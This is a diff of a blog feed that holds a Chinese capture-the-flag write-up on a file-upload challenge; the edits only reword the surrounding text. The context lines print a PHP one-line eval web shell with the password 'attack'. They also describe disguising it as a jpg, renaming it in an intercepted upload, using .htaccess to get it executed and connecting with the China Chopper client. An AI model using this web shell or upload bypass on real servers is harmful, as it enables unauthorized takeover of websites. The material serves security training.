@@ -566,9 +566,9 @@ let's do it<br />
     <content><![CDATA[<p>涉及到.htaccess<br />
 <a id="more"></a><br />
 <img data-src="https://i.loli.net/2021/02/21/vU6IVNDxcr9YHbm.png" alt="" title="一目了然" /><br />
- 就是要我们上传一个 php 一句话木马</p>
+ 就是要我们上传一句话木马</p>
 <h2 id="解题思路"><a class="anchor" href="#解题思路">#</a> 解题思路</h2>
-<p>按照往常一样，我们先写一份一句话木马</p>
+<p>按照往常一样，我们先写一份 payload</p>
 <figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?php </pre></td></tr><tr><td data-num="2"></td><td><pre>@eval($_POST['attack']) ;</pre></td></tr><tr><td data-num="3"></td><td><pre>?></span></pre></td></tr></table></figure><p>将文本保存成 jpg 格式的图片，然后抓包上传。</p>
 <p><img data-src="https://i.loli.net/2021/02/21/nUXpQqmFbN9jGSe.png" alt="" /><br />
 将 filename 中的 jpg 格式改为 PHP，当作 php 文件解析。</p>
@@ -587,7 +587,7 @@ let's do it<br />
 <p><img data-src="https://i.loli.net/2021/02/21/oxy4dLInORQwpW8.png" alt="" /><br />
 可以看到.htaccess 文件上传成功。</p>
 <p>接下来我们只需要将刚刚上传失败的一句话木马再上传一遍即可。<br />
-<img data-src="https://i.loli.net/2021/02/21/5c4lN8zYBUqTDmy.png" alt="" title="这里不需要该任何东西" /><br />
+<img data-src="https://i.loli.net/2021/02/21/5c4lN8zYBUqTDmy.png" alt="" title="这里不需要改动什么了" /><br />
 <img data-src="https://i.loli.net/2021/02/21/Pqz34WrG5hLTMAJ.png" alt="" title="木马也已经上传成功了" /></p>
 <p>最后我们可以用菜刀链接服务器查看目录里藏着 flag 的文件了。</p>
 <p>菜刀连接，密码为 attack<br />
